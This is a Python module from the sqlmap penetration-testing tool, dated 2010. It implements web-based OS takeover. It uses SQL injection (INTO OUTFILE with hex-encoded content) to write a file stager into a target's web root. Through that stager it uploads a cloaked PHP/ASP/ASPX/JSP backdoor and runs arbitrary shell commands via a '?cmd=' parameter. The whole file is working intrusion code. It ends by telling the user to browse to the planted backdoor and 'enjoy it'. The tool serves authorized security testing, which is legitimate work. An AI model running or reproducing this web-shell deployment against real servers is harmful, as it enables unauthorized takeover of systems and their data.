#!/usr/bin/env python

"""
$Id: web.py 2403 2010-11-17 22:00:09Z inquisb $

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import os
import posixpath
import re

from extra.cloak.cloak import decloak
from lib.core.agent import agent
from lib.core.common import decloakToNamedTemporaryFile
from lib.core.common import getDirs
from lib.core.common import getDocRoot
from lib.core.common import ntToPosixSlashes
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.shell import autoCompletion
from lib.request.connect import Connect as Request


class Web:
    """
    This class defines web-oriented OS takeover functionalities for
    plugins.
    """

    def __init__(self):
        self.webApi         = None
        self.webBaseUrl     = None
        self.webBackdoorUrl = None
        self.webStagerUrl   = None
        self.webDirectory   = None

    def webBackdoorRunCmd(self, cmd):
        if self.webBackdoorUrl is None:
            return

        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl  = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
        page, _ = Request.getPage(url=cmdUrl, direct=True, silent=True)

        if page is not None:
            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

            if output:
                output = output.group(1)

        return output

    def webFileUpload(self, fileToUpload, destFileName, directory):
        inputFP = codecs.open(fileToUpload, "rb")
        retVal = self.__webFileStreamUpload(inputFP, destFileName, directory)
        inputFP.close()

        return retVal

    def __webFileStreamUpload(self, stream, destFileName, directory):
        stream.seek(0) # Rewind

        if self.webApi in ("php", "asp", "aspx", "jsp"):
            multipartParams = {
                                "upload":    "1",
                                "file":      stream,
                                "uploadDir": directory,
                              }

            page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)

            if "File uploaded" not in page:
                warnMsg  = "unable to upload the backdoor through "
                warnMsg += "the file stager on '%s'" % directory
                logger.warn(warnMsg)
                return False
            else:
                return True

    def __webFileInject(self, fileContent, fileName, directory):
        outFile     = posixpath.normpath("%s/%s" % (directory, fileName))
        uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
        query       = "LIMIT 1 INTO OUTFILE '%s' " % outFile
        query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
        query       = agent.prefixQuery(query)
        query       = agent.suffixQuery(query)
        payload     = agent.payload(newValue=query)
        page        = Request.queryPage(payload)
        return page

    def webInit(self):
        """
        This method is used to write a web backdoor (agent) on a writable
        remote directory within the web server document root.
        """

        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webApi is not None:
            return

        self.checkDbmsOs()

        infoMsg = "trying to upload the file stager"
        logger.info(infoMsg)

        default = None
        choices = ['asp', 'aspx', 'php', 'jsp']

        for ext in choices:
            if conf.url.endswith(ext):
                default = ext
                break

        if not default:
            if kb.os == "Windows":
                default = "asp"
            else:
                default = "php"

        message  = "which web application language does the web server "
        message += "support?\n"

        for count in xrange(len(choices)):
            ext = choices[count]
            message += "[%d] %s%s\n" % (count + 1, ext.upper(), (" (default)" if default == ext else ""))
            if default == ext:
                default = count + 1

        message = message[:-1]

        while True:
            choice = readInput(message, default=str(default))

            if not choice.isdigit():
                logger.warn("invalid value, only digits are allowed")

            elif int(choice) < 1 or int(choice) > len(choices):
                logger.warn("invalid value, it must be between 1 and %d" % len(choices))

            else:
                self.webApi = choices[int(choice) - 1]
                break

        kb.docRoot  = getDocRoot(self.webApi)
        directories = getDirs(self.webApi)
        directories = list(directories)
        directories.sort()

        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
        backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
        originalBackdoorContent = backdoorContent = backdoorStream.read()

        stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))

        for directory in directories:
            # Upload the file stager
            self.__webFileInject(stagerContent, stagerName, directory)
            requestDir  = ntToPosixSlashes(directory)

            if not requestDir:
                continue

            if requestDir[-1] != '/':
                requestDir += '/'

            requestDir = requestDir.replace(ntToPosixSlashes(kb.docRoot), "/")

            if isWindowsDriveLetterPath(requestDir):
                requestDir = requestDir[2:]

            requestDir = normalizePath(requestDir).replace("//", "/")

            if requestDir[0] != '/':
                requestDir = '/' + requestDir

            self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
            self.webStagerUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), stagerName)
            self.webStagerUrl = ntToPosixSlashes(self.webStagerUrl.replace("./", "/"))
            uplPage, _  = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)

            if "sqlmap file uploader" not in uplPage:
                warnMsg  = "unable to upload the file stager "
                warnMsg += "on '%s'" % directory
                logger.warn(warnMsg)
                continue

            elif "<%" in uplPage or "<?" in uplPage:
                warnMsg  = "file stager uploaded "
                warnMsg += "on '%s' but not dynamically interpreted ('%s')" % (directory, self.webStagerUrl)
                logger.warn(warnMsg)
                continue

            infoMsg  = "the file stager has been successfully uploaded "
            infoMsg += "on '%s' ('%s')" % (directory, self.webStagerUrl)
            logger.info(infoMsg)

            if self.webApi == "asp":
                runcmdName = "tmpe%s.exe" % randomStr(lowercase=True)
                runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)

                if match:
                    backdoorDirectory = match.group(1)
                else:
                    continue

                backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
                backdoorStream.file.truncate()
                backdoorStream.read()
                backdoorStream.seek(0)
                backdoorStream.write(backdoorContent)

                if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
                    self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl.rstrip('/'), backdoorName)
                    self.webDirectory = backdoorDirectory
                else:
                    continue

            else:
                if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
                    warnMsg  = "backdoor has not been successfully uploaded "
                    warnMsg += "with file stager probably because of "
                    warnMsg += "lack of write permission."
                    logger.warn(warnMsg)

                    message  = "do you want to try the same method used "
                    message += "for the file stager? [y/N] "
                    getOutput = readInput(message, default="N")

                    if getOutput in ("y", "Y"):
                        self.__webFileInject(backdoorContent, backdoorName, directory)
                    else:
                        continue

                self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                self.webDirectory = directory

            infoMsg  = "the backdoor has probably been successfully "
            infoMsg += "uploaded on '%s', go with your browser " % self.webDirectory
            infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
            logger.info(infoMsg)

            break
